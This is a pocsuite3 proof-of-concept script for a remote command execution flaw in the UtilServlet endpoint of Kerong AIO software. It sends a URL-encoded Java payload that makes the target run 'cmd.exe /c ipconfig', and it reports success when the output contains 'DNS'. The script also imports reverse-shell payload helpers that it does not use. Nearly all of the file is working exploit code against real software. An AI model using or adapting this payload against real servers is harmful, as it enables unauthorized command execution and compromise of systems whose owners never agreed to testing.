# _*_ coding:utf-8 _*_
# @Time : 2024/1/17
# @Author: 炼金术师诸葛亮
import re
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class kerongAIO_utilservlet_rce(POCBase):
    pocDesc = '''科荣AIO UtilServlet任意命令执行漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-17'
    name = '科荣AIO UtilServlet任意命令执行漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/UtilServlet'
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            data = 'operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+ipconfig").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and 'DNS' in response.text:
                result['VerifyInfo'] = {}



            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(kerongAIO_utilservlet_rce)